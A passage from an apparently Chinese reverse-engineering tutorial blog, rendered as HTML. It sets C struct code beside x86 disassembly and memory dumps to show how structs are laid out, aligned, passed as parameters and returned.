class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//结构体作为局部变量</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Pointer</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">float</span> x_pos;</span><br><span class=\"line\">\t<span class=\"type\">float</span> y_pos;</span><br><span class=\"line\">\t<span class=\"type\">float</span> z_pos;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">st</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a;</span><br><span class=\"line\">\t<span class=\"type\">short</span> b;</span><br><span class=\"line\">\t<span class=\"type\">char</span> c;</span><br><span class=\"line\">\t<span class=\"type\">int</span> arr[<span class=\"number\">10</span>];</span><br><span class=\"line\">\tPointer p1;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tst x;</span><br><span class=\"line\">\tx.a = <span class=\"number\">10</span>;</span><br><span class=\"line\">\tx.b = <span class=\"number\">20</span>;</span><br><span class=\"line\">\tx.c = <span class=\"number\">30</span>;</span><br><span class=\"line\">\tx.arr[<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">\tx.arr[<span class=\"number\">1</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx.p1.x_pos = <span class=\"number\">2.1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">func</span>();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401020</span> &gt;/&gt; \\<span class=\"number\">55</span>                    push    ebp</span><br><span class=\"line\"><span class=\"number\">00401021</span>  |.  <span class=\"number\">8B</span>EC                  mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401023</span>  |.  <span class=\"number\">83</span>EC <span class=\"number\">7</span>C               sub     esp,<span class=\"number\">0x7C</span></span><br><span class=\"line\"><span class=\"number\">00401026</span>  |.  <span class=\"number\">53</span>                    push    ebx</span><br><span class=\"line\"><span class=\"number\">00401027</span>  |.  <span class=\"number\">56</span>                    push    esi</span><br><span class=\"line\"><span class=\"number\">00401028</span>  |.  <span class=\"number\">57</span>                    push    edi</span><br><span class=\"line\"><span class=\"number\">00401029</span>  |.  <span class=\"number\">8</span>D7D <span class=\"number\">84</span>               lea     edi,[local<span class=\"number\">.31</span>]</span><br><span class=\"line\"><span class=\"number\">0040102</span>C  |.  B9 <span class=\"number\">1F</span>000000           mov     ecx,<span class=\"number\">0x1F</span></span><br><span class=\"line\"><span class=\"number\">00401031</span>  |.  B8 CCCCCCCC           mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00401036</span>  |.  F3:AB                 rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00401038</span>  |.  C745 C4 <span class=\"number\">0</span>A000000      mov     dword ptr ss:[ebp<span class=\"number\">-0x3C</span>],<span class=\"number\">0xA</span></span><br><span class=\"line\"><span class=\"number\">0040103F</span>  |.  <span class=\"number\">66</span>:C745 C8 <span class=\"number\">1400</span>       mov     word ptr ss:[ebp<span class=\"number\">-0x38</span>],<span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">00401045</span>  |.  C645 CA <span class=\"number\">1</span>E            mov     byte ptr ss:[ebp<span class=\"number\">-0x36</span>],<span class=\"number\">0x1E</span></span><br><span class=\"line\"><span class=\"number\">00401049</span>  |.  C745 CC <span class=\"number\">01000000</span>      mov     dword ptr ss:[ebp<span class=\"number\">-0x34</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">00401050</span>  |.  C745 D0 <span class=\"number\">02000000</span>      mov     dword ptr ss:[ebp<span class=\"number\">-0x30</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">00401057</span>  |.  C745 F4 <span class=\"number\">66660640</span>      mov     dword ptr ss:[ebp<span class=\"number\">-0xC</span>],<span class=\"number\">0x40066666</span></span><br><span class=\"line\"><span class=\"number\">0040105</span>E  |.  <span class=\"number\">5F</span>                    pop     edi</span><br><span class=\"line\"><span class=\"number\">0040105F</span>  |.  <span class=\"number\">5</span>E                    pop     esi</span><br><span class=\"line\"><span class=\"number\">00401060</span>  |.  <span class=\"number\">5B</span>                    pop     ebx</span><br><span class=\"line\"><span class=\"number\">00401061</span>  |.  <span class=\"number\">8B</span>E5                  mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">00401063</span>  |.  <span class=\"number\">5</span>D                    pop     ebp</span><br><span class=\"line\"><span class=\"number\">00401064</span>  \\.  C3                    retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//当结构体中变量不等宽时，分空间不再按照本机宽度分</span></span><br><span class=\"line\"><span class=\"comment\">//局部变量int+short+char 还是按照12字节分</span></span><br><span class=\"line\"><span class=\"comment\">//结构体中变量等宽时和局部变量一样</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">st</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tst x;</span><br><span class=\"line\">\tx.a = <span class=\"number\">10</span>;</span><br><span class=\"line\">\tx.b = <span class=\"number\">20</span>;</span><br><span class=\"line\">\tx.c = <span class=\"number\">30</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func2</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a = <span class=\"number\">10</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b = <span class=\"number\">20</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c = <span class=\"number\">30</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func3</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> arr[<span class=\"number\">3</span>] = &#123;<span class=\"number\">10</span>,<span class=\"number\">20</span>,<span class=\"number\">30</span>&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">func</span>();</span><br><span class=\"line\">\t<span class=\"built_in\">func2</span>();</span><br><span class=\"line\">    <span class=\"built_in\">func3</span>();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func</span><br><span class=\"line\"><span class=\"number\">00401020</span> &gt;/&gt; \\<span class=\"number\">55</span>                   push    ebp</span><br><span class=\"line\"><span class=\"number\">00401021</span>  |.  <span class=\"number\">8B</span>EC                 mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401023</span>  |.  <span class=\"number\">83</span>EC <span class=\"number\">4</span>C              sub     esp,<span class=\"number\">0x4C</span></span><br><span class=\"line\"><span class=\"number\">00401026</span>  |.  <span class=\"number\">53</span>                   push    ebx</span><br><span class=\"line\"><span class=\"number\">00401027</span>  |.  <span class=\"number\">56</span>                   push    esi</span><br><span class=\"line\"><span class=\"number\">00401028</span>  |.  <span class=\"number\">57</span>                   push    edi</span><br><span class=\"line\"><span class=\"number\">00401029</span>  |.  <span class=\"number\">8</span>D7D B4              lea     edi,[local<span class=\"number\">.19</span>]</span><br><span class=\"line\"><span class=\"number\">0040102</span>C  |.  B9 <span class=\"number\">13000000</span>          mov     ecx,<span class=\"number\">0x13</span></span><br><span class=\"line\"><span class=\"number\">00401031</span>  |.  B8 CCCCCCCC          mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00401036</span>  |.  F3:AB                rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00401038</span>  |.  C745 F4 <span class=\"number\">0</span>A000000     mov     [local<span class=\"number\">.3</span>],<span class=\"number\">0xA</span></span><br><span class=\"line\"><span class=\"number\">0040103F</span>  |.  C745 F8 <span class=\"number\">14000000</span>     mov     [local<span class=\"number\">.2</span>],<span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">00401046</span>  |.  C745 FC <span class=\"number\">1E000000</span>     mov     [local<span class=\"number\">.1</span>],<span class=\"number\">0x1E</span></span><br><span class=\"line\"><span class=\"number\">0040104</span>D  |.  <span class=\"number\">5F</span>                   pop     edi</span><br><span class=\"line\"><span class=\"number\">0040104</span>E  |.  <span class=\"number\">5</span>E                   pop     esi</span><br><span class=\"line\"><span class=\"number\">0040104F</span>  |.  <span class=\"number\">5B</span>                   pop     ebx</span><br><span class=\"line\"><span class=\"number\">00401050</span>  |.  <span class=\"number\">8B</span>E5                 mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">00401052</span>  |.  <span class=\"number\">5</span>D                   pop     ebp</span><br><span class=\"line\"><span class=\"number\">00401053</span>  \\.  C3                   retn</span><br><span class=\"line\"></span><br><span class=\"line\">func2</span><br><span class=\"line\"><span class=\"number\">00401080</span> &gt;/&gt; \\<span class=\"number\">55</span>                   push    ebp</span><br><span class=\"line\"><span class=\"number\">00401081</span>  |.  <span class=\"number\">8B</span>EC                 mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401083</span>  |.  <span class=\"number\">83</span>EC <span class=\"number\">4</span>C              sub     esp,<span class=\"number\">0x4C</span></span><br><span class=\"line\"><span class=\"number\">00401086</span>  |.  <span class=\"number\">53</span>                   push    ebx</span><br><span class=\"line\"><span class=\"number\">00401087</span>  |.  <span class=\"number\">56</span>                   push    esi</span><br><span class=\"line\"><span class=\"number\">00401088</span>  |.  <span class=\"number\">57</span>                   push    edi</span><br><span class=\"line\"><span class=\"number\">00401089</span>  |.  <span class=\"number\">8</span>D7D B4              lea     edi,[local<span class=\"number\">.19</span>]</span><br><span class=\"line\"><span class=\"number\">0040108</span>C  |.  B9 <span class=\"number\">13000000</span>          mov     ecx,<span class=\"number\">0x13</span></span><br><span class=\"line\"><span class=\"number\">00401091</span>  |.  B8 CCCCCCCC          mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00401096</span>  |.  F3:AB                rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00401098</span>  |.  C745 FC <span class=\"number\">0</span>A000000     mov     [local<span class=\"number\">.1</span>],<span class=\"number\">0xA</span></span><br><span class=\"line\"><span class=\"number\">0040109F</span>  |.  C745 F8 <span class=\"number\">14000000</span>     mov     [local<span class=\"number\">.2</span>],<span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">004010</span>A6  |.  C745 F4 <span class=\"number\">1E000000</span>     mov     [local<span class=\"number\">.3</span>],<span class=\"number\">0x1E</span></span><br><span class=\"line\"><span class=\"number\">004010</span>AD  |.  <span class=\"number\">5F</span>                   pop     edi</span><br><span class=\"line\"><span class=\"number\">004010</span>AE  |.  <span class=\"number\">5</span>E                   pop     esi</span><br><span class=\"line\"><span class=\"number\">004010</span>AF  |.  <span class=\"number\">5B</span>                   pop     ebx</span><br><span class=\"line\"><span class=\"number\">004010B</span>0  |.  <span class=\"number\">8B</span>E5                 mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">004010B</span>2  |.  <span class=\"number\">5</span>D                   pop     ebp</span><br><span class=\"line\"><span class=\"number\">004010B</span>3  \\.  C3                   retn</span><br><span class=\"line\"></span><br><span class=\"line\">func3</span><br><span class=\"line\"><span class=\"number\">004106F</span>0 &gt;/&gt; \\<span class=\"number\">55</span>                    push    ebp</span><br><span class=\"line\"><span class=\"number\">004106F</span>1  |.  <span class=\"number\">8B</span>EC                  mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">004106F</span>3  |.  <span class=\"number\">83</span>EC <span class=\"number\">4</span>C               sub     esp,<span class=\"number\">0x4C</span></span><br><span class=\"line\"><span class=\"number\">004106F</span>6  |.  <span class=\"number\">53</span>                    push    ebx</span><br><span class=\"line\"><span class=\"number\">004106F</span>7  |.  <span class=\"number\">56</span>                    push    esi</span><br><span class=\"line\"><span class=\"number\">004106F</span>8  |.  <span class=\"number\">57</span>                    push    edi</span><br><span class=\"line\"><span class=\"number\">004106F</span>9  |.  <span class=\"number\">8</span>D7D B4               lea     edi,[local<span class=\"number\">.19</span>]</span><br><span class=\"line\"><span class=\"number\">004106F</span>C  |.  B9 <span class=\"number\">13000000</span>   \t\tmov     ecx,<span class=\"number\">0x13</span></span><br><span class=\"line\"><span class=\"number\">00410701</span>  |.  B8 CCCCCCCC   \t\tmov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00410706</span>  |.  F3:AB         \t\trep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00410708</span>  |.  C745 F4 <span class=\"number\">0</span>A000&gt;\t\tmov     [local<span class=\"number\">.3</span>],<span class=\"number\">0xA</span></span><br><span class=\"line\"><span class=\"number\">0041070F</span>  |.  C745 F8 <span class=\"number\">14000</span>&gt;\t\tmov     [local<span class=\"number\">.2</span>],<span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">00410716</span>  |.  C745 FC <span class=\"number\">1E000</span>&gt;\t\tmov     [local<span class=\"number\">.1</span>],<span class=\"number\">0x1E</span></span><br><span class=\"line\"><span class=\"number\">0041071</span>D  |.  <span class=\"number\">5F</span>            \t\tpop     edi</span><br><span class=\"line\"><span class=\"number\">0041071</span>E  |.  <span class=\"number\">5</span>E            \t\tpop     esi</span><br><span class=\"line\"><span class=\"number\">0041071F</span>  |.  <span class=\"number\">5B</span>            \t\tpop     ebx</span><br><span class=\"line\"><span class=\"number\">00410720</span>  |.  <span class=\"number\">8B</span>E5          \t\tmov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">00410722</span>  |.  <span class=\"number\">5</span>D            \t\tpop     ebp</span><br><span class=\"line\"><span class=\"number\">00410723</span>  \\.  C3            \t\tretn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>结构体可以作为参数和返回值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct st</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tshort b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void func(st x)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tst x;</span><br><span class=\"line\">\tx.a = 1;</span><br><span class=\"line\">\tx.b = 2;</span><br><span class=\"line\">\tx.c = 3;</span><br><span class=\"line\">\tfunc(x);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00401040 55                   push        ebp</span><br><span class=\"line\">00401041 8B EC                mov         ebp,esp</span><br><span class=\"line\">00401043 83 EC 48             sub         esp,48h</span><br><span class=\"line\">00401046 53                   push        ebx</span><br><span class=\"line\">00401047 56                   push        esi</span><br><span class=\"line\">00401048 57                   push        edi</span><br><span class=\"line\">00401049 8D 7D B8             lea         edi,[ebp-48h]</span><br><span class=\"line\">0040104C B9 12 00 00 00       mov         ecx,12h</span><br><span class=\"line\">00401051 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">00401056 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">00401058 C7 45 F8 01 00 00 00 mov         dword ptr [ebp-8],1</span><br><span class=\"line\">0040105F 66 C7 45 FC 02 00    mov         word ptr [ebp-4],offset main+23h (00401063)</span><br><span class=\"line\">00401065 C6 45 FE 03          mov         byte ptr [ebp-2],3</span><br><span class=\"line\">00401069 8B 45 FC             mov         eax,dword ptr [ebp-4]</span><br><span class=\"line\">0040106C 50                   push        eax</span><br><span class=\"line\">0040106D 8B 4D F8             mov         ecx,dword ptr [ebp-8]</span><br><span class=\"line\">00401070 51                   push        ecx</span><br><span class=\"line\">00401071 E8 A3 FF FF FF       call        @ILT+20(func) (00401019)</span><br><span class=\"line\">00401076 83 C4 08             add         esp,8</span><br><span class=\"line\">00401079 33 C0                xor         eax,eax</span><br><span class=\"line\">0040107B 5F                   pop         edi</span><br><span class=\"line\">0040107C 5E                   pop         esi</span><br><span class=\"line\">0040107D 5B                   pop         ebx</span><br><span class=\"line\">0040107E 83 C4 48             add         esp,48h</span><br><span class=\"line\">00401081 3B EC                cmp         ebp,esp</span><br><span class=\"line\">00401083 E8 E8 00 00 00       call        __chkesp (00401170)</span><br><span class=\"line\">00401088 8B E5                mov         esp,ebp</span><br><span class=\"line\">0040108A 5D                   pop         ebp</span><br><span class=\"line\">0040108B C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\">ebp-4</span><br><span class=\"line\">0018FF44  02 00 03 CC 88 FF 18</span><br><span class=\"line\">ebp-8</span><br><span class=\"line\">0018FF40  01 00 00 00 02 00 03</span><br><span class=\"line\">第二次push的时候把short和char一起push了</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">struct st</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">\tint d;</span><br><span class=\"line\">\tint e;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void func(st x)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tst x;</span><br><span class=\"line\">\tx.a = 1;</span><br><span class=\"line\">\tx.b = 2;</span><br><span class=\"line\">\tx.c = 3;</span><br><span class=\"line\">\tx.d = 4;</span><br><span class=\"line\">\tx.e = 5;</span><br><span class=\"line\">\tfunc(x);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00401040 55                   push        ebp</span><br><span class=\"line\">00401041 8B EC                mov         ebp,esp</span><br><span class=\"line\">00401043 83 EC 54             sub         esp,54h</span><br><span class=\"line\">00401046 53                   push        ebx</span><br><span class=\"line\">00401047 56                   push        esi</span><br><span class=\"line\">00401048 57                   push        edi</span><br><span class=\"line\">00401049 8D 7D AC             lea         edi,[ebp-54h]</span><br><span class=\"line\">0040104C B9 15 00 00 00       mov         ecx,15h</span><br><span class=\"line\">00401051 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">00401056 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">00401058 C7 45 EC 01 00 00 00 mov         dword ptr [ebp-14h],1</span><br><span class=\"line\">0040105F C7 45 F0 02 00 00 00 mov         dword ptr [ebp-10h],2</span><br><span class=\"line\">00401066 C7 45 F4 03 00 00 00 mov         dword ptr [ebp-0Ch],3</span><br><span class=\"line\">0040106D C7 45 F8 04 00 00 00 mov         dword ptr [ebp-8],4</span><br><span class=\"line\">00401074 C7 45 FC 05 00 00 00 mov         dword ptr [ebp-4],5</span><br><span class=\"line\">0040107B 83 EC 14             sub         esp,14h</span><br><span class=\"line\">0040107E B9 05 00 00 00       mov         ecx,5</span><br><span class=\"line\">00401083 8D 75 EC             lea         esi,[ebp-14h]</span><br><span class=\"line\">00401086 8B FC                mov         edi,esp</span><br><span class=\"line\">00401088 F3 A5                rep movs    dword ptr [edi],dword ptr [esi]</span><br><span class=\"line\">0040108A E8 8A FF FF FF       call        @ILT+20(func) (00401019)</span><br><span class=\"line\">0040108F 83 C4 14             add         esp,14h</span><br><span class=\"line\">00401092 33 C0                xor         eax,eax</span><br><span class=\"line\">00401094 5F                   pop         edi</span><br><span class=\"line\">00401095 5E                   pop         esi</span><br><span class=\"line\">00401096 5B                   pop         ebx</span><br><span class=\"line\">00401097 83 C4 54             add         esp,54h</span><br><span class=\"line\">0040109A 3B EC                cmp         ebp,esp</span><br><span class=\"line\">0040109C E8 CF 00 00 00       call        __chkesp (00401170)</span><br><span class=\"line\">004010A1 8B E5                mov         esp,ebp</span><br><span class=\"line\">004010A3 5D                   pop         ebp</span><br><span class=\"line\">004010A4 C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\">此时传参和push原理一样，此时先把所有堆栈提升，再填充提升的堆栈</span><br><span class=\"line\">结构体传参通过堆栈传参</span><br></pre></td></tr></table></figure>\n<p>结构体作为返回值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401040 55                   push        ebp</span><br><span class=\"line\">00401041 8B EC                mov         ebp,esp</span><br><span class=\"line\">00401043 83 EC 70             sub         esp,70h</span><br><span class=\"line\">00401046 53                   push        ebx</span><br><span class=\"line\">00401047 56                   push        esi</span><br><span class=\"line\">00401048 57                   push        edi</span><br><span class=\"line\">00401049 8D 7D 90             lea         edi,[ebp-70h]</span><br><span class=\"line\">0040104C B9 1C 00 00 00       mov         ecx,1Ch</span><br><span class=\"line\">00401051 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">00401056 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">00401058 8D 45 D0             lea         eax,[ebp-30h]</span><br><span class=\"line\">0040105B 50                   push        eax</span><br><span class=\"line\">0040105C E8 BD FF FF FF       call        @ILT+25(func3) (0040101e)</span><br><span class=\"line\">00401061 83 C4 04             add         esp,4</span><br><span class=\"line\"></span><br><span class=\"line\">00401064 8B 08                mov         ecx,dword ptr [eax]</span><br><span class=\"line\">00401066 89 4D E0             mov         dword ptr [ebp-20h],ecx</span><br><span class=\"line\">00401069 8B 50 04             mov         edx,dword ptr [eax+4]</span><br><span class=\"line\">0040106C 89 55 E4             mov         dword ptr [ebp-1Ch],edx</span><br><span class=\"line\">0040106F 8B 48 08             mov         ecx,dword ptr [eax+8]</span><br><span class=\"line\">00401072 89 4D E8             mov         dword ptr [ebp-18h],ecx</span><br><span class=\"line\">00401075 8B 50 0C             mov         edx,dword ptr [eax+0Ch]</span><br><span 